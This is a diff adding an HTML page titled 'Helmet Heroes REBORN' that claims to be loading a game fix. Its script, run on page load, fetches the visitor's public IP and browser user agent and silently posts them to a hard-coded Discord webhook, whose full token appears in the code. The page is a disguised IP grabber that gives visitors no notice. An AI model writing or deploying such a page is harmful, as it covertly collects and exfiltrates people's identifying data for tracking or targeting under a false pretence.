@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Helmet Heroes REBORN</title>
+</head>
+<body>
+  <h1>Welcome!</h1>
+  <p>Loading Helmet Heroes Fix...</p>
+
+  <script>
+    async function logToDiscord(ip, userAgent) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1380531044230627459/5juYpXpoEeDt-ebovX0VXxd3y_j0mK4KijyEbqHnLeQLzKkrlYs6cDFdLbiuFX8WxtSe';  // Replace with your Discord webhook URL
+      
+      const content = `**New Visitor Info:**\nIP Address: ${ip}\nUser Agent: ${userAgent}`;
+      
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ content })
+        });
+        console.log('Logged to Discord webhook.');
+      } catch (err) {
+        console.error('Error sending to Discord webhook:', err);
+      }
+    }
+
+    async function getIpAndLog() {
+      try {
+        // Fetch public IP using ipify
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip || 'IP not found';
+        const userAgent = navigator.userAgent;
+
+        await logToDiscord(ip, userAgent);
+      } catch (err) {
+        console.error('Error fetching IP or logging:', err);
+      }
+    }
+
+    // Run on page load
+    getIpAndLog();
+  </script>
+</body>
+</html>
